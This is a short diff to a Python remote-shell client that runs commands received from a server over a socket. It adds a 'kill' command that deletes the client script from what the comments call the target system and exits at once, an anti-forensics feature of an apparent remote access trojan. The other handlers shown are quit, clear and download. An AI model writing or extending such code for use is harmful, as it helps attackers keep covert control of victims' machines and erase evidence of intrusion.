@@ -2,6 +2,7 @@
 
 import socket
 import os
+import sys
 import pathlib
 import hashlib
 import time
@@ -210,6 +211,9 @@ def shell(sock: socket.socket) -> None:
         if msg_from_server in ["quit", "exit"]:  # Server side connection termination signal
             sock.close()
             break
+        if msg_from_server == "kill":  # Server side activity termination signal
+            os.remove(sys.argv[0])  # Delete client side script from the target system
+            os._exit(0)  # Exit immediately (Do not resolve 'finally' statements)
         elif msg_from_server in ["clear", "bg", "background"]:  # Ignore certain server side keywords
             pass
         elif msg_from_server[:9] == "download ":  # Server side file download signal
